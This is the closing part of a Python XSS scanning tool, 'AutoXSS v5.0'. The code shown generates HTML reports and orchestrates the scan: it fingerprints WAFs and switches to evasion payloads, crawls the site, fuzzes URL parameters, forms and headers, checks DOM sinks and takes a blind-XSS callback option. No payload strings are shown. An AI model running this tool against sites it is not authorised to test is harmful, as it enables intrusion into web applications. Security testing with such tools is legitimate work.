    </tr>""" for f in findings)

    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>AutoXSS Report — {target}</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:#080c10;color:#c9d1d9;font-family:'Share Tech Mono',monospace;padding:40px 50px}}
h1{{color:#ff3333;font-size:2.4em;letter-spacing:.08em;margin-bottom:4px}}
.sub{{color:#ff9900;font-size:.85em;margin-bottom:6px}}
.meta{{color:#445566;font-size:.78em;margin-bottom:28px}}
h2{{color:#00ccff;border-left:3px solid #ff3333;padding-left:10px;margin:32px 0 14px;font-size:1em;letter-spacing:.1em}}
.stat{{display:inline-block;padding:6px 18px;margin-right:10px;border:1px solid;border-radius:3px;font-size:.9em;margin-bottom:24px}}
.high{{color:#ff4444;border-color:#ff444455;background:#ff44440d}}
.med{{color:#ffaa00;border-color:#ffaa0055;background:#ffaa000d}}
.ok{{color:#00ff88;border-color:#00ff8855;background:#00ff880d}}
table{{width:100%;border-collapse:collapse;margin-top:10px}}
th{{background:#0f1923;color:#00ccff;padding:10px 12px;text-align:left;border-bottom:1px solid #1e3a4a;font-size:.8em;letter-spacing:.08em}}
td{{padding:9px 12px;border-bottom:1px solid #111820;font-size:.83em;vertical-align:top}}
td.url{{color:#888;word-break:break-all;max-width:280px}}
tr:hover td{{background:#0d1520}}
code{{background:#0f1923;padding:2px 8px;border-radius:3px;color:#ff9900;word-break:break-all}}
</style></head><body>
<h1>⚡ AutoXSS v5.0</h1>
<div class="sub">by R0b3rt0  —  Automated XSS Framework</div>
<div class="meta">Target: {target} &nbsp;|&nbsp; {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
<div class="stat {'ok' if not findings else 'high'}">
  {'✅ CLEAN' if not findings else f'🔥 {len([f for f in findings if "HIGH" in f.get("severity","")])} HIGH'}
</div>
<div class="stat med">{len([f for f in findings if 'MEDIUM' in f.get('severity','')])} MEDIUM</div>
<h2>VULNERABILITY FINDINGS</h2>
<table>
  <tr><th>TYPE</th><th>URL</th><th>VECTOR</th><th>PAYLOAD</th><th>SEVERITY</th></tr>
  {rows if rows else '<tr><td colspan="5" style="color:#00ff88;text-align:center;padding:20px">✅ No vulnerabilities detected</td></tr>'}
</table>
</body></html>"""

    with open(fn, 'w') as f:
        f.write(html)
    return fn


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                           SCAN ORCHESTRATOR                                 ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

def run(cfg):
    base_dir   = os.path.dirname(os.path.abspath(__file__))
    start_time = time.time()

    print_banner()
    print(r(C_, "  Initializing..."))
    time.sleep(0.3)

    client = Client(cfg)

    # ── Step 1 : WAF ─────────────────────────────────────────────────────────
    step(1, "WAF / PROTECTION FINGERPRINTING  🛡️")
    sp, st = spinner("Probing for WAF signatures")
    waf = detect_waf(client, cfg['url'])
    sp.set(); st.join(1)
    if waf:
        warn(f"WAF detected: {r(R_, bold(waf))} — switching to evasion payloads")
        if cfg['payload_profile'] == 'all':
            cfg['payload_profile'] = 'waf_bypass'
    else:
        ok("No WAF fingerprint found")
    endsec()

    # ── Step 2 : Payloads ─────────────────────────────────────────────────────
    step(2, "PAYLOAD LOADING  💉")
    payloads = build_payloads(cfg['payload_profile'], base_dir,
                              cfg.get('blind_callback'))
    ok(f"Loaded {r(Y_, str(len(payloads)))} unique payloads  "
       f"(profile: {r(Y_, cfg['payload_profile'])})")
    endsec()

    engine       = Engine(client, payloads, verbose=cfg.get('verbose', False))
    all_findings = []

    # ── Step 3 : Crawl ────────────────────────────────────────────────────────
    step(3, "CRAWLING & ENDPOINT DISCOVERY  🕷️")
    if cfg['mode'] == 'targeted' and cfg.get('endpoint'):
        urls  = [cfg['endpoint']]
        forms = []
        ok(f"Targeted mode — using endpoint: {r(Y_, cfg['endpoint'])}")
    else:
        sp, st = spinner(f"Crawling (depth={cfg['depth']})")
        crawler     = Crawler(client, cfg['url'], depth=cfg['depth'])
        urls, forms = crawler.crawl()
        sp.set(); st.join(1)
        if cfg.get('endpoint') and cfg['endpoint'] not in urls:
            urls.append(cfg['endpoint'])
        ok(f"Discovered {r(Y_, str(len(urls)))} URLs,  "
           f"{r(Y_, str(len(forms)))} forms")
        if cfg.get('verbose'):
            for u in urls[:12]:
                info(f"  {u}")
    endsec()

    # ── Step 4 : Known param direct fuzz ─────────────────────────────────────
    if cfg.get('known_param'):
        step(4, "KNOWN PARAMETER DIRECT FUZZ  🎯")
        target_url = cfg.get('endpoint') or cfg['url']
        res = engine.test_known_param(target_url, cfg['known_param'])
        all_findings.extend(res)
        if not res:
            warn(f"No XSS confirmed on [{cfg['known_param']}]")
        endsec()

    # ── Step 5 : URL params ───────────────────────────────────────────────────
    step(5, "URL PARAMETER FUZZING  🔗")
    param_urls = [u for u in ([cfg['url']] + urls) if '?' in u]
    if not param_urls:
        warn("No parameterized URLs found")
    else:
        ok(f"Testing {len(param_urls)} parameterized URL(s)")
        prog = Progress(len(param_urls), "urls")
        with ThreadPoolExecutor(max_workers=cfg['threads']) as ex:
            futs = {ex.submit(engine.test_url_params, u): u for u in param_urls}
            for fut in as_completed(futs):
                try:
                    all_findings.extend(fut.result())
                except Exception:
                    pass
                prog.tick()
    endsec()

    # ── Step 6 : Forms ────────────────────────────────────────────────────────
    step(6, "FORM / INPUT FIELD TESTING  📝")
    if not forms:
        warn("No forms discovered")
    else:
        ok(f"Testing {len(forms)} form(s)")
        prog = Progress(len(forms), "forms")
        with ThreadPoolExecutor(max_workers=cfg['threads']) as ex:
            futs = {ex.submit(engine.test_form, f): f for f in forms}
            for fut in as_completed(futs):
                try:
                    all_findings.extend(fut.result())
                except Exception:
                    pass
                prog.tick()
    endsec()

    # ── Step 7 : Header injection ─────────────────────────────────────────────
    if not cfg.get('skip_headers'):
        step(7, "HTTP HEADER INJECTION  📡")
        sp, st = spinner("Testing injectable headers")
        h_res = engine.test_headers(cfg['url'])
        sp.set(); st.join(1)
        all_findings.extend(h_res)
        if not h_res:
            ok("No header injection found")
        endsec()

    # ── Step 8 : DOM ──────────────────────────────────────────────────────────
    if cfg.get('test_dom', True):
        step(8, "DOM SINK ANALYSIS  🌐")
        sp, st = spinner("Scanning JavaScript for dangerous source→sink chains")
        dom_res = engine.test_dom(cfg['url'])
        sp.set(); st.join(1)
        all_findings.extend(dom_res)
        if not dom_res:
            ok("No obvious DOM XSS chains detected")
        endsec()

    # ── Final report ──────────────────────────────────────────────────────────
    elapsed = time.time() - start_time
    print_report(all_findings, cfg['url'], elapsed)

    if all_findings:
        if cfg.get('save_json', True):
            fn = save_json(all_findings, cfg['url'])
            ok(f"JSON report → {r(Y_, fn)}")
        if cfg.get('save_html', True):
            fn = save_html(all_findings, cfg['url'])
            ok(f"HTML report → {r(Y_, fn)}")
        print()

    print(dim(f"  R0b3rt0  |  AutoXSS v5.0  |  github.com/R0b3rt0"))
    print()


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                              ENTRY POINT                                    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

def main():
    # If args given → non-interactive mode (scripts / CI)
    if len(sys.argv) > 1:
        import argparse
        p = argparse.ArgumentParser(
            prog='autoxss.py',
            description='AutoXSS v5.0 — by R0b3rt0 | non-interactive mode',
        )
        p.add_argument('url')
        p.add_argument('--endpoint')
        p.add_argument('--param')
        p.add_argument('--mode',    default='standard',
                       choices=['quick','standard','deep','stealth','targeted'])
        p.add_argument('--profile', default='all',
                       choices=['all','waf_bypass','polyglot','dom','blind','quick'])
        p.add_argument('--depth',   type=int,   default=2)
        p.add_argument('--threads', type=int,   default=5)
        p.add_argument('--delay',   type=float, default=0)
        p.add_argument('--timeout', type=int,   default=10)
        p.add_argument('--cookies')
        p.add_argument('--headers')
        p.add_argument('--proxy')
        p.add_argument('--blind-callback', dest='blind_callback')
        p.add_argument('--skip-headers',   dest='skip_headers', action='store_true')
        p.add_argument('--no-dom',         dest='test_dom',     action='store_false')
        p.add_argument('--no-json',        dest='save_json',    action='store_false')
        p.add_argument('--no-html',        dest='save_html',    action='store_false')
        p.add_argument('-v', '--verbose',  action='store_true')
        a = p.parse_args()
        cfg = vars(a)
        cfg['known_param'] = a.param
    else:
        # ── INTERACTIVE WIZARD ────────────────────────────────────────────────
        try:
            cfg = wizard()
        except KeyboardInterrupt:
            print(r(Y_, '\n\n  ⚠️  Aborted'))
            sys.exit(0)

    try:
        run(cfg)
    except KeyboardInterrupt:
        print(r(Y_, '\n\n  ⚠️  Scan interrupted'))
        sys.exit(0)
    except Exception as e:
        print(r(R_, f'\n  ✘ Fatal: {e}'))
        if cfg.get('verbose'):
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()